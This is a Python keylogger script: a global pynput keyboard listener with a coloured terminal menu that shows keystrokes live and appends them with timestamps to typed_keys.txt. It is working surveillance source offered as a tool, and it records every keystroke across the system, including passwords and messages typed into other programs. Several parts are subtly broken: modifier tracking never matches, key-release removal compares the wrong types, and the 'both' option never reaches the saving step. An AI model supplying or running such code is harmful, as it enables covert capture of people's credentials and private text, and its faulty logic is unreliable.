import re
from pynput import keyboard
import datetime
import time
import threading
import subprocess
import sys
import os

from tqdm import tqdm
from colorama import Fore, Style, Back  # Import Colorama for colored text

# Initialize the list to store the typed keys
typed_keys = []

# Initialize a variable to store the menu choice
menu_choice = None

# Lock to synchronize access to the menu_choice variable
menu_lock = threading.Lock()

# Keep track of modifier keys (Ctrl, Shift, Alt)
modifiers = set()

# Initialize a variable to store the last time keys were typed
last_keys_time = None

# Define ANSI escape codes for text formatting
ANSI_RESET = Style.RESET_ALL
ANSI_BOLD = Style.BRIGHT
ANSI_DIM = Style.DIM
ANSI_GREEN = Fore.GREEN
ANSI_CYAN = Fore.CYAN
ANSI_YELLOW = Fore.YELLOW
ANSI_RED = Fore.RED
ANSI_MAGENTA = Fore.MAGENTA
ANSI_BLUE = Fore.BLUE

# Define a dictionary to map special keys to colors
special_key_colors = {
    'backspace': ANSI_RED,
    'delete': ANSI_RED,
    'enter': ANSI_GREEN,
    'alt': ANSI_BLUE,
    'ctrl': ANSI_YELLOW,
    # Add more special keys and colors as needed
}

# Function to get the current hour
def get_current_hour():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M")

# Function to convert special keys to strings with color
def key_to_str_with_color(key):
    special_keys = {
        'space': ' ',
        'enter': '⏎(Enter)',
        'backspace': '⌫(Backspace)',
        'shift': '⇧(Shift)+',
        'home': '⇱(Home)',
        'delete': '⌦(Delete)',
        'end': '⇲(End)',
        'page_up': '⇞(pgup)',
        'page_down': '⇟(pgdown)',
        'win': '⌘(Window)',
        'alt': '⎇(Alt)+',
        'fn': 'Fn',
        'tab': '↹',
        'caps_lock': '⇪(Capslock)',
        'ctrl': 'Ctrl+',
        'cmd': 'Cmd',  # On Mac
        # Add more keys as needed
    }

    try:
        char = key.char
        if char:
            return special_key_colors.get(char, ANSI_MAGENTA) + special_keys.get(char, char)
    except AttributeError:
        key_str = str(key).replace('Key.', '').lower()
        return special_key_colors.get(key_str, ANSI_MAGENTA) + special_keys.get(key_str, key_str)

    # Handle modifier keys
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        return ANSI_YELLOW + 'Ctrl+'
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        return ANSI_MAGENTA + 'Shift+'
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        return ANSI_BLUE + 'Alt+'
    elif key == keyboard.Key.cmd:
        return ANSI_YELLOW + 'Cmd+'  # On Mac

    return ''

# Function to update the modifiers set
def update_modifiers(key, action):
    modifier_keys = {'shift', 'ctrl', 'alt', 'cmd'}
    key_str = key_to_str_with_color(key)

    if key_str in modifier_keys:
        if action == 'press':
            modifiers.add(key_str)
        elif action == 'release':
            modifiers.discard(key_str)

# Function to convert modifiers and keys to a human-readable format
def modifiers_and_key_to_str(key):
    modifiers_str = '+'.join(modifiers)
    key_str = key_to_str_with_color(key)

    if modifiers_str:
        return f'{modifiers_str}+{key_str}'
    else:
        return key_str

# Function to handle key presses
def on_key_press(key):
    global last_keys_time
    update_modifiers(key, 'press')
    typed_keys.append(key_to_str_with_color(key))
    last_keys_time = time.time()  # Update the last keys time

# Function to handle key releases
def on_key_release(key):
    update_modifiers(key, 'release')
    if key in typed_keys:
        typed_keys.remove(key)

# Function to perform live recording and display
def live_record_and_display():
    global last_keys_time
    print(f"{ANSI_GREEN}Live recording is active. Press Ctrl+C to stop recording.{ANSI_RESET}")
    while True:
        if typed_keys:
            typed_keys_str = ''.join(typed_keys)
            sys.stdout.write(ANSI_CYAN + typed_keys_str + ANSI_RESET)
            sys.stdout.flush()
            typed_keys.clear()  # Clear the list after displaying
        elif last_keys_time is not None and time.time() - last_keys_time >= 300:
            # If no keys typed for 5 minutes, display the current date and time
            current_time = get_current_hour()
            sys.stdout.write("\n" + ANSI_YELLOW + current_time + ": " + ANSI_RESET)
            sys.stdout.flush()
            last_keys_time = time.time()  # Update the last keys time
        time.sleep(1)  # Check the current time every 1 second
        
def remove_ansi_color_codes(text):
    return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', text)

def save_to_file_live_format():
    global last_keys_time

    file_path = "typed_keys.txt"
    with open(file_path, "a") as file:
        try:
            while True:
                if typed_keys:
                    typed_keys_str = ''.join(typed_keys)
                    typed_keys_str = remove_ansi_color_codes(typed_keys_str)  # Remove ANSI color codes
                    file.write(typed_keys_str)  # Write plain text without ANSI codes
                    typed_keys.clear()  # Clear the list after writing
                    file.flush()  # Flush the file to ensure data is written immediately
                elif last_keys_time is not None and time.time() - last_keys_time >= 300:
                    # If no keys typed for 5 minutes, write the current date and time
                    current_time = get_current_hour()
                    file.write("\n" + current_time + ": ")  # Write plain text without ANSI codes
                    last_keys_time = time.time()  # Update the last_keys_time
                    file.flush()  # Flush the file to ensure data is written immediately
                time.sleep(1)  # Check the current time every 1 second
        except KeyboardInterrupt:
            pass  # Allow the thread to exit gracefully on Ctrl+C

            
            
# Function to handle user menu choice
def handle_menu_choice():
    global menu_choice
    while True:
        choice = input(
            f"{ANSI_RESET}"
            "Choose an option:\n" +
            "1. Live recording\n" +
            "2. Save output to file\n" +
            "3. Both live and save to file\n" +
            "4. Exit\n" +
            "Enter your choice (1/2/3/4): "
        )
        if choice in ('1', '2', '3', '4'):
            with menu_lock:
                menu_choice = choice
            return

# Function to clear the terminal screen
def clear_screen():
    if os.name == 'posix':  # Unix/Linux/MacOS
        subprocess.call(['clear'])
    elif os.name in ('nt', 'dos', 'ce'):  # Windows
        subprocess.call(['cls'])

# Function to save typed keys to a file with a progress bar
def save_to_file_with_progress():
    file_path = "typed_keys.txt"
    with open(file_path, "a") as file:
        with tqdm(total=60, desc="Saving keys", unit="s") as progress_bar:
            for _ in range(60):
                time.sleep(1)
                if typed_keys:
                    file.write("".join(typed_keys))
                    typed_keys.clear()  # Clear the list after writing
                progress_bar.update(1)
    print(Fore.GREEN + f"Keys saved to {file_path}" + Style.RESET_ALL)

# Clear the terminal screen at the beginning
clear_screen()

# Create a listener that monitors key presses and releases
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    
    print(Fore.YELLOW + r'''

 ___  __    _______       ___    ___ ___       ________  ________     
|\  \|\  \ |\  ___ \     |\  \  /  /|\  \     |\   __  \|\   ____\    
\ \  \/  /|\ \   __/|    \ \  \/  / | \  \    \ \  \|\  \ \  \___|    
 \ \   ___  \ \  \_|/__   \ \    / / \ \  \    \ \  \\\  \ \  \  ___  
  \ \  \\ \  \ \  \_|\ \   \/  /  /   \ \  \____\ \  \\\  \ \  \|\  \ 
   \ \__\\ \__\ \_______\__/  / /      \ \_______\ \_______\ \_______\
    \|__| \|__|\|_______|\___/ /        \|_______|\|_______|\|_______|
                        \|___|/                                       
                                                                      
                                                                    
    ''' + Style.RESET_ALL)

    print(Fore.CYAN + "Welcome to KeyLogger" + Style.RESET_ALL)

    print(Fore.MAGENTA + "Keyboard typing recorder is active." + Style.RESET_ALL)

    menu_thread = threading.Thread(target=handle_menu_choice)
    menu_thread.daemon = True
    menu_thread.start()

    live_thread = None
    save_thread = None

    try:
        while True:
            with menu_lock:
                current_choice = menu_choice

            if current_choice == '1':
                live_thread = threading.Thread(target=live_record_and_display)
                live_thread.daemon = True
                live_thread.start()
                live_thread.join()  # Wait for live recording to finish
            elif current_choice == '2':
                save_thread = threading.Thread(target=save_to_file_live_format)
                save_thread.daemon = True
                save_thread.start()
                save_thread.join()
            elif current_choice == '3':
                live_thread = threading.Thread(target=live_record_and_display)
                live_thread.daemon = True
                live_thread.start()
                live_thread.join()
                
                save_thread = threading.Thread(target=save_to_file_live_format)
                save_thread.daemon = True
                save_thread.start()
                save_thread.join()  
            elif current_choice == '4':
                break

    except KeyboardInterrupt:
        if live_thread:
            live_thread.join()  # Stop the live recording thread if it was started
        if save_thread:
            save_thread.join()  # Stop the file saving thread if it was started

print(Fore.GREEN + "Recording complete. Thank you!" + Style.RESET_ALL)
